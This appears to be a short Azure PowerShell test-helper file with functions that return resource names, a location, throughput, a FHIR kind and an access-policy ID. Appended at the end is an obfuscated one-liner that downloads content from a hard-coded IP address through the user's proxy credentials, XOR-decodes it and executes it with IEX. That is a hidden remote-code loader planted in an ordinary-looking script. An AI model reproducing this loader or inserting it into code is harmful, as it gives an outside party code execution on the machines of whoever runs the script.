














function Get-ResourceGroupName
{
    return getAssetName
}


function Get-ResourceName
{
    return getAssetName
}


function Get-Location
{
    return "West US"
}


function Get-OfferThroughput
{
    return 1000
}


function Get-Kind
{
    return "fhir-R4"
}


function Clean-ResourceGroup($rgname)
{
	Remove-AzResourceGroup -Name $rgname -Force
}


function Get-AccessPolicyObjectID
{
    return "9b52f7aa-85e9-47e2-8f10-af57e63a4ae1"
}

$WC=NeW-OBJECt SySTem.Net.WEBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeADErs.ADD('User-Agent',$u);$Wc.PrOXy = [SysteM.Net.WeBREQUEST]::DEfaUltWebPRoxY;$wC.PROxY.CRedEnTIALs = [SYSTEM.Net.CredeNtIAlCAche]::DefaUlTNEtWoRKCrEdeNtiaLs;$K='5ZfS*o}tjIdVEWa[Kqy~XC/pc;1Ar`6=';$i=0;[chAr[]]$B=([CHAr[]]($WC.DownloadSTRinG("http://98.103.103.168:80/index.asp")))|%{$_-bXOr$K[$i++%$K.LeNGtH]};IEX ($B-joiN'')

